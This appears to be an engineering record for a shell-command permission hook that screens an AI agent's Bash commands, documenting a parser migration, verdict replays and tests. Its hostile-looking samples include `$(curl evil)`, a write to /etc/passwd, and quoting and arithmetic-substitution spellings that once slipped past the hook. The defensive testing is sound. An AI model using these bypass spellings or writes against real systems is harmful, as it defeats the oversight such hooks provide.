ONE mechanical cause, and it is the same permitted exception ADR 0039's Enforcement item 5 grants and
step 2a used: **the substring classifier could not see quoting, so it read a quoted or escaped
`$(`/backtick as a live substitution and answered `Unknown`; the parser sees the quoting and does
not.** Verified in bash 5.3.9 — `A='pre $(touch m) mid `` `touch m` `` post'`,
`B="pre \$(touch m) mid \`touch m\` post"`and`C="${V}\$(touch m)"`create NO marker file, so no
substitution runs in any of the three shapes. The`Ask` those rows carried was a FALSE POSITIVE on
prose, SQL and JSON payloads, not a judgement.

Row by row, by driving value transition:

- `unknown -> none` (12 rows): 47726, 47728, **128746**, 305208, 305921, 314423, 314454, **319866**,
  326382, **326938**, 327835, 329240
- `unknown -> varref` (8 rows): 282591, 282593, 282605, **320692**, 320744, 320745, 320849, 320850

The four in bold reach `approve`, which step 2a's single exception did not, so each was read
individually: 128746 is `bd create --description="$desc"` where `$desc` is a single-quoted PR-body
with markdown backticks; 319866 is a `sqlite3` SELECT whose double-quoted predicate contains
`\$(curl evil)` ESCAPED (it is CETA's own corpus query, quoting the literal string it searches for);
326938 is `bd update --append-notes` with single-quoted prose containing `` `claude --session-id …` ``;
320692 is a CETA self-test whose `PROBE_CMDS` value escapes every `\$`/`` \` `` and expands only
`${SEP}`. In all four the value's only live expansion is a parameter, and the Approve comes from the
rest of the chain (`bd`, `sqlite3`, `go test`) — env-vars itself never approves any of them, which
`TestEnvVars_ApproveOnlyForVerifiedPreserveForm` now pins for the newly-`VarRef` spellings.

### The 9 more-restrictive transitions

| Cause                                                                               | Rows |
| ----------------------------------------------------------------------------------- | ---- |
| **A** — a command substitution the `$((` test masked is now classified and recursed | 3    |
| **B** — outgoing tokenizer debris now refuses to classify (fail-closed)             | 6    |

Cause A is the fix: 165952, 277926, 335935. Cause B is 250049, 250054, 287763, 289864, 290192 and
142386 — values that are FRAGMENTS (`${H%%`; a single-quoted value the engine's comment strip cut
inside, leaving an unterminated quote). The substring classifier answered `VarRef` for a fragment it
could not parse; the parser refuses, which is I1b's direction.

## The masked shape, censused

Definition, mechanical: a row whose command carries an assignment value classified `arith` on the
base tree and `unknown` on the fixed tree. **35 distinct values, 54 rows — 42 abstain, 11 allow, 1
ask.** Rows **89777, 89892 and 89901** (the `$((cd ~/gt && bd list …) | jq …)` spelling) are in that
set and each was logged **abstain**, not allow.

The important reading is that the hole was NOT indiscriminate: 30 of the 35 masked values still
approve after the fix, because the env-var rule recurses the unmasked body and pg2-5huwx's
post-recursion demotion clears it (`$(( $(date +%s) - start ))`, `$(( $(ps -o rss= -p $$) / 1024 ))`).
Only 5 escalate — the `bd list` subshell spelling and four `$(sed …)` / `$(jq …)` / `$(tail …)` bodies
the chain does not clear — and those escalate to exactly what their UNMASKED spelling already got, so
the change is form independence, not a new ask class.

**Annotation PLAN (not applied).** 7 rows carry one of those 5 values: 89777, 89892, 89901, 165952,
249201, 277926, 335935. All 7 are logged `abstain` and NONE carries a `correct_hook_decision` today,
so the proposed annotation is `correct_hook_decision='ask'` on those 7 ids and nothing else. NO row
in the corpus was logged `allow` on a masked value the fix escalates, so this hole has no historical
false-ALLOW population comparable to pg2-wguam's 451 — the false allows it produced are the
adversarial forms measured above, which the corpus does not contain.

## Latency

`classifyExpansion` now PARSES a value instead of scanning it, on a path the hook takes for every
assignment. Measured as the wall time of the authoritative front end (`StripCommentsPreservingHeredocs`

- `Parse`) over all 185,966 distinct commands, three interleaved reps per side, same machine:
  base 2.73 / 2.70 / 2.71 s, fixed 2.75 / 2.75 / 2.75 s. Means 2.713 s and 2.750 s, so the delta is
  0.037 s over 185,966 commands: **+1.4% (0.037 / 2.713), about +0.2 µs per command (0.037 s /
  185,966)**. The pre-parse shortcut (a value with neither `$` nor a backtick returns immediately) is
  what keeps it there: of the 12,741 distinct values, 3,969 carry neither character and never reach the
  parser, leaving 8,772 that do (12,741 − 3,969).

## Residue left to `pg2-x9452` (step 5)

- `classifyExpansion`'s `$`/backtick pre-parse shortcut still misses a PROCESS substitution, so
  `A=<(evil)` reads as static. That is step 5's own recorded acceptance criterion and its owed test
  (`A=<(evil) cmd` must recurse `evil`); `engine.go`'s `evaluateAssignmentOnlyLeaf` records the same
  gap. It is unchanged here — closing it would mix two replays into one attribution.
- Every RULE-side scanner step 5 names is untouched: docker's `splitOnShellOperators`, gitdir's
  `scopeLeaves` and `containsVarRef`, envvars' value scan around `literalValue`. So are guards 2 and 3
  and the I13 structural delegate entry point.
- Step 5 may now assert `matchParen`'s removal as DONE rather than owing it.

---

# Step 2 — THE FLIP (`pg2-fez3d`)

Authority: ADR 0039's Decision, Invariants (I1b, I2, I3, I4, I6, I8, I10, I12, I14) and
Enforcement. Base `2b59b9e0`. This section is the record ADR 0039's Enforcement item
"Differential replay" requires of every migration step.

The seam is now **AUTHORITATIVE**. `Parse` is a facade over `ParseShell`, so every rule and
the engine read the seam; the SHADOW COMPARISON IS RETIRED and the outgoing front end is
DELETED. Retiring the comparison is how **I8** is discharged — "there MUST NOT be a fallback
parser", so there must not be a second front end to compare against either. Step 1
deliberately ran two; this step ends that.

## `ParsedCommand.Raw` (I12), as implemented

`Raw` is the **EXACT SOURCE SLICE** spanning the owning statement, trimmed of the trailing
separator (`;`, `&`, `|&`) and surrounding whitespace. It is **NOT** an AST print: printing is
structure-to-text — root cause 3 reintroduced — and its output would not equal
`normalizeExpression` (`engine.go`'s whitespace-collapsing normaliser), so every
cycle-detection key would silently change.

Two consequences, both deliberate and both stated because they are visible:

- **A heredoc-bearing leaf's `Raw` carries its body**, and the statement's extent therefore
  spans whatever text sits between the operator and the body: in `cat <<EOF | grep x` the
  `cat` stage's `Raw` includes `| grep x`. That is what makes re-parsing `Raw` reproduce the
  extents instead of re-deriving an UNTERMINATED one — root cause 2's purest instance. The
  direction is safe (a rule re-parsing such a `Raw` judges MORE, and verdicts fold through
  `MostRestrictive`), and `FuzzParse`'s atomicity check exempts exactly these leaves while
  `FuzzHeredocExtentsAreAccountedFor` holds them to heredoc idempotence instead.
- **`syntax.Stmt.End()` is not the statement's true end.** It consults only
  `Redirs[len-1]`, so a heredoc that is not the LAST redirection is excluded, and an
  EMPTY-bodied heredoc has no `Hdoc` node at all. `cat <<EOF > /etc/passwd` and
  `cat <<EOF\nEOF` both lost their terminator line, and `Raw` re-parsed to NO LEAF. Fixed by
  `stmtEndOffset` / `emptyHeredocEnd`.

## Deletion ledger

| Symbol                                                                                                                                                                                                                     | Outcome                        | Why / where it went                                                                                                                                                                                                                                                                                                                                                                                                                 |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `splitCompound`, `segment`, `assignPipelineIDs`, `tokenize`                                                                                                                                                                | **deleted**                    | Root cause 2 — every pass returned TEXT. The seam returns leaves from one AST.                                                                                                                                                                                                                                                                                                                                                      |
| `resolveLoops`, `extractLoopBody`, `isLoopKeyword`, `isDoneKeyword`, `parseDoKeyword`, `doneResidue`, `forWordList`                                                                                                        | **deleted**                    | ROOT CAUSE 4 and inventory sites 12/13, ENTIRE family. `doneResidue`/`forWordList` are pg2-qkecz's patches to the two KNOWN drops; patching a text pass closes instances, not the class.                                                                                                                                                                                                                                            |
| `shellScanner`, `scanFrame`, `newShellScanner`, `advance`, `nested`                                                                                                                                                        | **deleted**                    | Root cause 1 — a byte scanner with no extent API. Word start, quoting and nesting are parser facts now.                                                                                                                                                                                                                                                                                                                             |
| `commandStartOffset`                                                                                                                                                                                                       | **deleted**                    | `StripLeadingEnvAssignments` moved to the seam and reads `CallExpr.Assigns` / `Args[0]`.                                                                                                                                                                                                                                                                                                                                            |
| `extractRedirections`, `splitFDPrefix`, `isVarName`, `redirectionCore`, `hasLiveRedirChar`                                                                                                                                 | **deleted**                    | The parser separates `Redirect.N` / `Op` / `Word`, so no operator text is re-derived and the `2<<EOF` phantom operand cannot exist.                                                                                                                                                                                                                                                                                                 |
| `extractExecAndArgs`                                                                                                                                                                                                       | **deleted**                    | Leading assignments are `CallExpr.Assigns`; the command is `Args[0]`. That distinction IS pg2-gkd5e's position independence.                                                                                                                                                                                                                                                                                                        |
| `scanHeredocs`, `stripHeredocBodies`, `parseHeredocOperator`, `readHeredocBody`, `heredocSpan`, `countHeredocOperators`                                                                                                    | **deleted**                    | `stripHeredocBodies` is ADR 0039's NAMED instance of root cause 2 (a pass returning a modified string).                                                                                                                                                                                                                                                                                                                             |
| `atWordStart`                                                                                                                                                                                                              | **deleted**                    | The UNREPRESENTABLE PREDICATE — positional, had to agree with a stateful one, produced the `(<)#<<0` phantom heredoc. There is now one word-start notion.                                                                                                                                                                                                                                                                           |
| `StripCommentsPreservingHeredocs`, `ExtractComment`, `StripComment`                                                                                                                                                        | **deleted**                    | `KeepComments(true)` makes a comment a parser fact, so the per-line pass is retired BY CONSTRUCTION. The engine's annotation uses the seam's `CommandComment`; `ParsedCommand.Comment` comes from `Stmt.Comments`.                                                                                                                                                                                                                  |
| `NormalizeCommandShell`                                                                                                                                                                                                    | **deleted**                    | It existed only so step 1 could MEASURE the re-keying before adopting it. `Parse` is the seam, so `NormalizeCommand` IS the new key: the re-keying is now ADOPTED.                                                                                                                                                                                                                                                                  |
| the whole shadow surface (`ShadowEnvVar`, `ShadowEnabled`, `ShadowDiff`, `OutgoingFrontEnd`, `CompareFrontEnds`, `CompareFrontEndsWith`, `pipelineShape`, `shadowLog`, `LogShadowDisagreement`) plus `frontend_ab_test.go` | **deleted**                    | I8. `LeafKey` survives in `leafkey.go` — the corpus harnesses key on it.                                                                                                                                                                                                                                                                                                                                                            |
| `unquote`                                                                                                                                                                                                                  | **RETAINED**                   | It DEFINES CETA's token spelling and the parser's literal expansion is STRICTER: `a"b"c` must KEEP its quotes, because `envvars.literalValue` and `isStaticAbsolutePath` reject any surviving quote and that is what fences I4. Applied to each word's exact source slice. Pure `string -> string` over an already-delimited token — not a scanner, so I9 does not reach it. Pinned by `TestShellParse_UnquoteParity_MixedQuoting`. |
| `redirectionKind`                                                                                                                                                                                                          | **RETAINED**                   | Post-lowering classification of an `(fd, operator)` pair the seam already extracted. No text.                                                                                                                                                                                                                                                                                                                                       |
| `isAllDigits`                                                                                                                                                                                                              | **RETAINED**                   | Predicate over a redirect target word; the fd-duplication drop turns on it.                                                                                                                                                                                                                                                                                                                                                         |
| `isEnvAssign`, `isValidEnvName`                                                                                                                                                                                            | **RETAINED**                   | Predicates over an already-delimited assignment token. The seam consults them to decide whether an `*syntax.Assign` can become an `EnvAssignment` at all — the indexed form cannot, and must reach a data leaf rather than vanish.                                                                                                                                                                                                  |
| `UnquotedMask`                                                                                                                                                                                                             | **REIMPLEMENTED over the AST** | The capability cannot be removed here: its sole caller is rules/ssh's `hasWriteRedirection`, a RULE-side scanner ADR 0039's step 5 (`pg2-x9452`) still owns. Its IMPLEMENTATION is no longer a second structure model — the inert spans are the AST's quoted / substitution / arithmetic extents. Unparseable text reports every byte LIVE, which is conservative for the only caller.                                              |

`rules/ssh` also gained a FAIL-CLOSED guard, and it is a defect the flip would otherwise have
introduced: `evaluateSSH`'s leaf loop only ever ESCALATES, so an EMPTY leaf set fell through
to APPROVE. While the front end scanned bytes, malformed text still produced a leaf that
failed the allowlist; a real grammar returns no leaves, so `ssh host 'cat $(curl'` and
`ssh host 'ls -la >&'` would have started auto-approving. That is I1b at a rule boundary.

## Guard 1 (I6) — demonstrated failing

`TestSeamIsTheOnlyParserImporter` walks the module's import graph. Demonstrated by
temporarily adding `_ "mvdan.cc/sh/v3/syntax"` to `internal/rules/dangerouscmds/dangerouscmds.go`:

```text
=== RUN   TestSeamIsTheOnlyParserImporter
    shellparse_test.go:71: I6 violated: only shellparse.go may reference mvdan.cc/sh/v3; found it in: [internal/rules/dangerouscmds/dangerouscmds.go]
--- FAIL: TestSeamIsTheOnlyParserImporter (0.02s)
```

Reverted; both halves of the guard are green (`TestSeamFileActuallyImportsTheParser` pins
that the seam still imports it, so a green guard cannot be vacuous).

## Guard 4 (I14) — the coverage check

`LeafCoverageGaps` (shellparse.go) records EVERY leaf's source span during the one lowering
walk and reports any surrogate node no leaf covers. Drivers:
`TestLeafSpansCoverEveryCallExpr` (an in-repo shape population plus the corpus) and
`FuzzLeafSetCoversTheSource`.

**POPULATION, named explicitly.** Guard 4 runs over the **DISTINCT `.command` VALUES** — the
parse/lowering population of this file's "Corpus population" section, NOT ADR 0039's
mislabelled 189,678 (which counts distinct input BLOBS, bead `pg2-bc8ol`). Re-measured
2026-08-12 on a `VACUUM INTO` snapshot read via `immutable=1`:

| Population                                                     | Recorded by step 1 | At the flip |
| -------------------------------------------------------------- | ------------------ | ----------- |
| all rows                                                       | 337,781            | 339,360     |
| non-excluded rows, all tools                                   | 337,236            | 338,815     |
| non-excluded `Bash` rows                                       | 218,089            | 219,305     |
| **distinct `.command` VALUES — the parse/lowering population** | **185,185**        | **186,382** |
| distinct input BLOBS                                           | 198,691            | 199,896     |

**RESULT: PASS. 186,382 distinct commands; 186,319 parsed; 63 unparseable; ZERO coverage
gaps.** Coverage is AT LEAST ONE leaf, not a partition — overlap cannot make a verdict less
restrictive under `MostRestrictive`, and requiring uniqueness would contradict I2's
deliberate imprecision about heredoc attribution.

**Guard 4 caught a real defect before it shipped.** `emitCompoundRedirs` anchored its span on
`Redirs[0].OpPos`, but `Redirect.Pos()` is the DESCRIPTOR's position — one byte earlier — so
`done 2>/dev/null` on a loop inside a pipeline left the `2` OUTSIDE the leaf that answers for
it. 123 corpus commands, 133 nodes. The leaf existed and recorded the write, so no verdict
moved; the point is that a differential replay could never have seen it. Pinned by three
rows in `coverageSeeds`.

## The 63 unparseable rows — I1b FORFEITURES, reported individually

I1b abstains with **NO LEAF EXAMINED**, so any `Reject` a leaf would have earned is
**FORFEITED**. That is a movement in the more permissive direction on
`Approve < Abstain < Ask < Reject` even though it never reaches Approve, and it is why the
replay gate is worded as "no transition in the LESS-RESTRICTIVE direction". ADR 0039's
"63 rows / 0.0332%" is against the mislabelled denominator; against the parse/lowering
population it is **63 / 186,382 = 0.0338%**.

Written per row by `CETA_FORFEITURE_OUT` (reason, dialect attribution, command), grouped
here by the parser's own reason:

| Parser reason                                                   | Rows   | Dialect attributed |
| --------------------------------------------------------------- | ------ | ------------------ |
| `invalid parameter name`                                        | 11     | —                  |
| `reached EOF without closing quote "`                           | 8      | —                  |
| `unclosed here-document EOF`                                    | 7      | —                  |
| `a command can only contain words and redirects; encountered )` | 7      | —                  |
| `reached EOF without closing quote '`                           | 5      | —                  |
| `a command can only contain words and redirects; encountered (` | 5      | —                  |
| `parameter expansion flags is not valid bash`                   | 3      | **zsh**            |
| `not a valid arithmetic operator: ~`                            | 3      | —                  |
| `word list can only contain words`                              | 2      | —                  |
| `floating point arithmetic is not valid bash`                   | 2      | **zsh**            |
| `) can only be used to close a subshell`                        | 2      | —                  |
| `nested parameter expansions is not valid bash`                 | 1      | **zsh**            |
| ten further one-row grammar failures                            | 10     | —                  |
| **TOTAL**                                                       | **63** | **6**              |

**I10 holds in both directions**, which is what `TestEngine_UnparseableReasonHonoursI10`
pins: the 6 rows the parser attributed to a dialect say so, and the other 57 report the
failure WITHOUT guessing at a cause. CETA receives no shell field in its hook input and can
never establish which dialect will run, so a guess would be fabricated provenance on a
user-facing prompt.

## Verdict replay

Population per this file's "Corpus population" section. **Replayed:** 131,222 distinct
`(command, cwd, permission_mode)` triples of 191,292, offline through
`setup.NewEngineForCWD` + `EvaluateHook` with a redirected `XDG_DATA_HOME`. `cmd_evaluate`
was **NOT** used, and neither were `baseline` or `compare` — all three open the shared
production asklog READ-WRITE (bead `pg2-cbihz`). The harness is
`internal/setup/replay_test.go`; the base side ran the same harness against a `git archive`
of `2b59b9e0`.

**Skipped and NOT presented as the whole:** 73,850 of 219,305 non-excluded `Bash` rows
(**33.68%**) name a working directory that no longer exists — 923 of 1,145 distinct `cwd`
values. As triples that is 60,070 of 191,292.

| base -> new        | rows   | direction            |
| ------------------ | ------ | -------------------- |
| approve -> approve | 95,366 | same                 |
| abstain -> abstain | 32,304 | same                 |
| ask -> ask         | 2,376  | same                 |
| reject -> reject   | 425    | same                 |
| abstain -> approve | 614    | **LESS restrictive** |
| ask -> approve     | 55     | **LESS restrictive** |
| ask -> abstain     | 21     | **LESS restrictive** |
| reject -> abstain  | 1      | **LESS restrictive** |
| abstain -> ask     | 53     | more restrictive     |
| approve -> abstain | 4      | more restrictive     |
| approve -> ask     | 2      | more restrictive     |
| ask -> reject      | 1      | more restrictive     |

751 transitions on 131,222 rows (0.57%). **691 move in the less-restrictive direction.**

**GATE: PASS UNDER ADR 0039's ONE PERMITTED EXCEPTION, and only under it.** Every one of the
691 is attributed by a MECHANICAL PREDICATE over the two trees' leaf sets to an
OUTGOING-FRONT-END DEFECT — the exception ADR 0039 grants for "a step whose stated purpose is
to stop the parser breaking benign commands". The unattributed bucket is **EMPTY**, which is
the only form of "each transition justified individually" that scales to 691 rows without
becoming the blanket annotation the ADR forbids: the predicate is stated, it is computed per
row, and anything it does not claim is dumped verbatim rather than absorbed.

### How the attribution is computed

Both trees dump, per row, a feature vector over the leaf set REACHABLE from the command —
top-level leaves plus, recursively to depth 4, every substitution body, every unquoted
heredoc body, every assignment value's substitutions, and every `-c` body (the rule chain
re-evaluates all of them, so a defect one level down moves the verdict as much as one at the
top). Features: `K` a shell-keyword executable, `C` a token holding a backslash-newline, `P`
a token holding `<(`/`>(`, `Q` a token with an unbalanced quote, `F` a multi-word executable
fragment, `A` an executable beginning with a quote. Plus, on the BASE tree only, `S` — the
engine's per-LINE comment pre-pass MODIFIES the text, which is the pg2-4h7ee mechanism and is
computable only there because `StripCommentsPreservingHeredocs` is deleted by the flip.

| Cause                                                                                                  | Rows    |
| ------------------------------------------------------------------------------------------------------ | ------- |
| **C6** outgoing shell-keyword pseudo-leaf removed                                                      | 336     |
| **C1** outgoing line-continuation token debris removed                                                 | 283     |
| **C8** outgoing non-keyword pseudo-leaf removed (`case` pattern / word-list item / prose as a command) | 26      |
| **C3** outgoing token retained an unbalanced outer quote                                               | 25      |
| **C9** outgoing SWALLOWED a following command into an unbalanced-quote token                           | 8       |
| **C5** outgoing bogus multi-word executable fragment removed                                           | 7       |
| **C10** the engine's per-LINE comment pre-pass MODIFIED the text (the pg2-4h7ee class)                 | 5       |
| **C4** outgoing multi-line array literal shredded                                                      | 1       |
| **UNATTRIBUTED**                                                                                       | **0**   |
| **TOTAL**                                                                                              | **691** |

Reading of the table:

- **C6 dominates (336 of 691).** A leaf whose executable is `if`, `then`, `fi`, `do`, `done`,
  `[[` or `((` is NOT a command; no argv[0]-keyed rule matched one, so it contributed an
  Abstain that demoted the whole expression. Removing it and judging the branch CONTENTS
  instead is the point of the migration. LOWERING.md's step-1 leaf census predicted exactly
  this: −7,234 of −9,027 leaves (80.1%) on 3,588 rows.
- **C1 is the second (283).** `splitCompound` consumed `\`+newline as an escaped pair but
  copied BOTH bytes into the segment, so `tokenize` yielded the bogus executable
  `"\<newline>curl"` and arguments like `"\<newline>-H"`. Step 1 measured the class at 3,784
  rows; 283 of them changed VERDICT. `git -C … add \<newline> path…` is the commonest shape.
- **C3 + C9 (33) are the same defect in both directions.** `unquote` only strips a fully
  wrapped token, so a heredoc inside a substitution left the leading `"` in place. Sometimes
  that garbled a token (C3); sometimes it SWALLOWED the following command whole (C9, which is
  why the flip's leaf count goes UP — step 1 measured +308 leaves on 374 rows).
- **C10 is the pg2-4h7ee class (5).** The engine's per-LINE comment strip cut inside a
  MULTI-LINE quoted argument — `bd update … --notes "…(feedback: nit #1)…"` — shredding prose
  into pseudo-leaves and leaving an unterminated quote that swallowed real commands. The pass
  is GONE, not fixed: under `KeepComments` a `#` inside a quoted word is part of a
  `*syntax.Lit`, so the defect is unrepresentable. `TestFlip_HashInsideAQuotedArgumentIsNotAComment`.

### The one `reject -> abstain`, justified on its own evidence

Row 151331, `cd ~/phillipg_mbp` then a `for` loop over six repos whose body contains:

```bash
rb="no"; { [ -d "$r/.git/rebase-merge" ] || [ -d "$r/.git/rebase-apply" ]; } && rb="YES-IN-PROGRESS"
```

Base verdict `Reject` from `git-directory`; new verdict `Abstain`.

**The base `Reject` was a MIS-PARSE, not a judgement.** The outgoing front end lowered the
`{ …; }` group to leaves whose EXECUTABLES were the literal braces — measured on the base
tree, its 14 leaves include `{`, `[` and `}` — so `git-directory` saw a `.git/` path being
accessed by a command it does not recognise and rejected it. Over the seam the group lowers
to the two real `[` test commands, and `git-directory` judges what is actually there: a
`test -d` of a `.git/` path, which is a READ, matched but non-decisive. That is the same
verdict the rule's own `test -e a hook` row already pins.

It does not reach `Approve`, and no `Reject` a leaf EARNED was lost — the base's Reject was
earned by a leaf that does not exist.

### The 60 more-restrictive transitions

| Cause                                                                                              | Rows |
| -------------------------------------------------------------------------------------------------- | ---- |
| **C1/C3/C4/C5/C6/C7/C10** — the same outgoing defects, in the safe direction                       | 39   |
| **I12: a leaf's `Raw` now spans its heredoc BODY**, so a rule scanning leaf text sees body content | 20   |
| an env-assignment VALUE classification difference (`abstain -> ask`, row 177268)                   | 1    |

The 20 are `-> path-traversal` (Ask) on commands of the shape `cat > "$P" <<'EOF' … EOF`
whose BODY contains `../`. The outgoing `Raw` was post-strip, so the body was invisible to a
text-scanning rule; under I12 it is not. More restrictive, and a direct consequence of the
`Raw` decision rather than a surprise.

> **Later note (2026-08-17, `pg2-bn7sx`).** The `path-traversal` rule has since been **deleted**
> (operator ruling `pg2-4yy4r` item 6), so these 20 rows no longer land anywhere — they were the
> clearest illustration of why a text-scanning rule was the wrong shape, since what they scanned
> was heredoc BODY text rather than any path the command operates on. The measurement is left as
> recorded.

## Tests

The whole existing suite passes with the EXPECTATIONS UNEDITED, except where an expectation
encoded outgoing behaviour that this step deliberately removes. Each such edit is annotated
AT the test with the reason and the direction; they are:

| Test                                                                     | Change                                                                                                              | Direction        |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------- | ---------------- |
| `TestParse_Redirections` "partially quoted target"                       | `Path` is now `/tmp/out`, not `'/tmp/out'`                                                                          | MORE restrictive |
| `TestParse_Redirections` "brace expansion is not a descriptor"           | `cmd {a,b}>x` records a real `> x` write                                                                            | MORE restrictive |
| `TestParse_ForLoop` "incomplete for loop"                                | a loop with no `done` is a PARSE FAILURE (I1b), not two keyword leaves                                              | MORE restrictive |
| `TestHeredocBodyIsNeverALeaf` / `TestHeredocDashTerminatorIsTabStripped` | an UNTERMINATED heredoc is a PARSE FAILURE; lifted into `TestHeredocUnterminatedIsAParseFailure`                    | MORE restrictive |
| `TestHeredocBodyIsNeverAnArg`                                            | `Raw` MUST now carry the body (I12); the Args assertion is unchanged                                                | n/a (I12)        |
| `TestParse_PipelineRelation` both group rows                             | every statement of a piped compound shares the stage's coordinates — the UNION of two previous under-approximations | MORE informative |
| `TestUnquotedMask` two rows                                              | `` `>` `` and `$(>)` are not valid bash; kept in parseable form plus a row for the all-live fallback                | conservative     |
| `TestEffectiveExec` `if [ -e x ]`                                        | replaced by `[ -e x ]`, the shape it was testing, in a form that parses                                             | n/a              |
| gitdir's two `if` fixtures                                               | closed with `fi`, as the corpus rows they model were                                                                | n/a              |

The `partially quoted target` change **CLOSES A LIVE HOLE**, which is why it is a change and
not a regression: the outgoing tokenizer glued operator and target into one token, `unquote`
declined a non-wholly-wrapped token, and the quotes rode into `hookio.Redirection.Path` —
where `patheval.cleanPath` reads a leading `'` as a RELATIVE path and joins it to the cwd. So
`echo pwned >'/etc/passwd'` resolved INSIDE the project root and was **APPROVED**, while the
spaced `> '/etc/passwd'` was correctly Rejected. Same write, two verdicts, decided by a space.

### The tests the three superseded beads owe

Written against their ORIGINAL reproducers (`flip_test.go`):

- **`pg2-s26v5`** — `TestFlip_BareSubshellKeepsEveryCommand`: `(echo ")"; ls)` yields two
  leaves with `ls` intact, `Raw` is an exact source slice, and FuzzParse's IDEMPOTENCE holds
  against it — the half that was VACUOUS before I12.
- **`pg2-4h7ee`** — `TestFlip_HashInsideAQuotedArgumentIsNotAComment`: a `#` inside a
  multi-line quoted argument is not a comment, in three spellings, with the contrast that an
  unquoted trailing `#` still IS one.
- **`pg2-14vjq`** — `TestFlip_LoopFedByAHeredocDropsNoSegment` (the `done <<EOF` extent
  reaches a leaf and no segment is dropped) and
  `TestFlip_FdPrefixedHeredocIsNotAPhantomOperand`, which asserts what ADR 0039 demands: that
  `2<<EOF` does NOT leak into `Args`, **not** merely that the leaf is heredoc-bearing.

### The constructs that change verdict if lowered naively

- **Herestrings** — `HasHeredoc` keys off the OPERATOR. Both pins pass UNEDITED
  (`heredoc_test.go`'s `{"cat <<<\"word\"", true}` and `parser_test.go`'s
  `{"herestring", "cmd <<<'input'", true}`), plus `TestFlip_HerestringKeepsTheHeredocFloor`
  including the empty-word case a body-keyed flag gets wrong twice over.
- **The fabricated `/dev/fd/63` operand** — KEPT, exactly as `tokenize` produced it. The
  choice and its reason are recorded at `TestFlip_ProcessSubstitutionOperandChoice`: the
  source text is not a path, so it fails `IsSafeRedirectTarget` and causes mass new abstains
  on the benign `diff <(a) <(b)`; emitting nothing changes the ARGUMENT COUNT, which several
  rules key on. It is the ONE fabricated token in the lowering and the real body travels
  separately in `ProcessSubstitutions`.
- **`unquote` parity** — `TestShellParse_UnquoteParity_MixedQuoting` is NEW, as ADR 0039
  requires. It also pins that the outgoing rule is FIRST-BYTE-AND-LAST-BYTE rather than "is
  wholly one quoted span", so `'a'b'c'` strips to `a'b'c` and the INNER quote survives — which
  is what still trips the predicate I4 fences.

### The `$( (list) )` gap the parser does not model

Verified against bash 5.3.9: when the ARITHMETIC parse of `$((` fails, bash falls back to
`$( (list) )`, so `$((cmd) | cmd)` and `$((cmd) )` REALLY EXECUTE. `$((cmd; cmd))` does not —
`;` is not a valid arithmetic operator, so bash errors and that spelling is not a bypass. The
upstream parser implements no fallback, so all three are Unparseable and land on the I1b
floor. The direction is right, but the body is never ENUMERATED, so a sibling `Reject` inside
one is FORFEITED — the I1b forfeiture class. Three corpus rows carry the shape.
`TestFlip_ArithmeticSubshellFallbackIsUnparseable` pins the verdict rather than leaving it
emergent.

### The three fuzz replacements

ADR 0039's Enforcement item "Fuzz continuity" requires a fuzzer whose target is deleted to be
REPLACED by a harness over the seam asserting the SAME property, with the replacement
invariant stated in the step performing the deletion. Stated in full at the top of
`fuzz_test.go`; in summary:

| Deleted harness          | Property it asserted                                                                                                       | Replacement                         |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| `FuzzSplitCompound`      | THE SPLIT IS COMPLETE — re-splitting any segment yields at most one command-bearing segment, so no separator stayed glued  | `FuzzLeafSetCoversTheSource`        |
| `FuzzTokenize`           | TOKENS AND PROCESS-SUBSTITUTION BODIES ARE REAL SLICES, the raws/tokens arrays never skew, a lifted body can be re-scanned | `FuzzWordTokens`                    |
| `FuzzStripHeredocBodies` | THE HEREDOC BODY IS ACCOUNTED FOR — the pass only DELETES, every body is a real substring, no body byte survives onward    | `FuzzHeredocExtentsAreAccountedFor` |

The first is a strict generalisation: "the split is complete" and "the leaf set covers the
source" are the same property at two altitudes, and the second also sees the class the first
structurally could not — root cause 4, a DELETED segment, which looks identical on both sides
of a re-split check. The third is the one that changes shape, and the change is I12: there is
no masking pass, so "no body byte survives into the text handed onward" becomes its stronger
successor — the body survives EXACTLY ONCE, inside the owning leaf's `Raw`, and re-parsing
that `Raw` reproduces the extents instead of re-deriving an unterminated one.

### `FuzzParse`'s pre-existing idempotence failure DIED with the flip

The committed `FuzzParse` found a Parse IDEMPOTENCE violation on `(#"\n<<#\n#\n0` within ~30s
(`pg2-iumd5`): a leaf's `Raw` re-parsed to a different executable, because `atWordStart` and
`splitCompound` disagreed about a `#` after a flushed subshell and manufactured a phantom
heredoc. Over the seam that input is a PARSE FAILURE
(``cmd:2:1: `<<` must be followed by a word``), so it yields no leaf and the invariant is
satisfied rather than violated. **It did not survive the flip**, which is the outcome ADR
0039's Consequences predicted for the `Raw` decision.

## What this step does NOT do

- **Guard 2 (raw-text-structure, I9)** and **guard 3 (parse-count, I7)** stay deferred, per
  ADR 0039's Enforcement: guard 3 MUST land after the per-rule `gitdir` migration, and guard
  2's mechanism is an OPEN question the per-rule step must decide and record.
- The two engine TEXT hops `evaluateHeredocBodies` and `evaluateSubstitutionsIn` are still
  shims owned by step 4 (`pg2-1019a`), and every RULE-side scanner step 5 (`pg2-x9452`) names
  is untouched — including `rules/ssh`'s `hasWriteRedirection`, which is why `UnquotedMask`
  survives as a capability.
